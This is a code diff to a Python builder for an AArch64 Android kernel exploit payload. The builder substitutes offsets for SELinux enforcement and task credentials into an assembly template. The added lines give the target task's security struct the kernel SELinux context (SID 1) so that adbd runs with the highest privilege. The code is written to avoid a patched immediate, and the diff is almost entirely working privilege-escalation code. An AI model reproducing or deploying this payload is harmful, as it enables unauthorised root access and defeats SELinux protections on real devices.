@@ -19,15 +19,28 @@ R_AARCH64_ABS64  = 0x101
 
 def _int(x): return int(x, 16) if isinstance(x, str) and x.lower().startswith("0x") else int(x)
 
-# <carrier> <out> <dsel> <dfv> <dpt> <pid> <dssuse> [enf_off] [cred_off]
+# <carrier> <out> <dsel> <dfv> <dpt> <pid> <dssuse> [enf_off] [cred_off] [cred_security_off]
 carrier, out = sys.argv[1], sys.argv[2]
 dsel, dfv, dpt, pid, dssuse = (_int(x) for x in sys.argv[3:8])
 enf_off  = _int(sys.argv[8]) if len(sys.argv) > 8 else 0        # selinux_state.enforcing byte offset
 cred_off = _int(sys.argv[9]) if len(sys.argv) > 9 else 0x778    # task_struct->cred
+# optional: cred->security offset. If given, ALSO set the target's SELinux context to kernel
+# (SECINITSID_KERNEL=1 in task_security_struct osid/sid/…) — used by --adb-root to give adbd the
+# highest context. No movz/movk added (offset + sid=1 are plain immediates).
+cred_security_off = _int(sys.argv[10]) if len(sys.argv) > 10 else None
+
+CTX = """    // context = kernel (SECINITSID_KERNEL=1) : cred->security = task_security_struct*
+    ldr  x4, [x2, #{off}]
+    cbz  x4, done
+    orr  w5, wzr, #1             // w5=1 via ORR (not movz -> not a patched-delta immediate)
+    stp  w5, w5, [x4, #0]        // osid, sid
+    stp  w5, w5, [x4, #8]        // exec_sid, create_sid
+    stp  w5, w5, [x4, #16]       // keycreate_sid, sockcreate_sid""".format(off=hex(cred_security_off)) \
+    if cred_security_off is not None else ""
 
 # --- assemble the template (substitute per-target struct offsets) ---
 tmpl = open(os.path.join(HERE, "asm", "cred_patch.S.tmpl")).read()
-src = tmpl.replace("@ENF_OFF@", str(enf_off)).replace("@CRED_OFF@", hex(cred_off))
+src = tmpl.replace("@ENF_OFF@", str(enf_off)).replace("@CRED_OFF@", hex(cred_off)).replace("@CTX@", CTX)
 s = "/tmp/cred_patch.S"; o = "/tmp/cred_patch.o"; b = "/tmp/cred_patch.bin"
 open(s, "w").write(src)
 subprocess.run([CLANG, "-target", "aarch64-linux-gnu", "-c", s, "-o", o], check=True, capture_output=True)
